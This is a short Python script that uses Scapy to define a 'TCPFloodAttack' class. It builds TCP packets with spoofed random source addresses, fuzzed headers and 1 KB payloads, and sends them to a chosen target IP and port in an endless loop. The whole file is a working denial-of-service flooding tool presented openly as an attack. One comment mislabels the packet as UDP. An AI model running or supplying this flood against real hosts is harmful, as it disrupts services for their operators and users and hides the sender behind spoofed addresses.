from scapy.all import *

class TCPFloodAttack(object):

    def sendTCPPackets(self, targetIP, targetPort):

        """
        Name: Send TCP Packets Function
        Type: void
        Description: This function takes in the targetIP, and targetPort. With this information
                    this function will then set up an infinite loop which the sending of TCP packets
                    filled with data will occur till the program is stopped or the connection is lost.
        """

        #Creating a UDP Packet with a Spoofed IP and specific targetIP and targetPort
        packetTCP = IP(src=RandIP("192.168.1.1/24"), dst=targetIP) / fuzz(TCP(dport=targetPort)) / fuzz(Raw(b"X" * 1024))

        #Sending n amounts of packets
        while True:
            send(packetTCP)
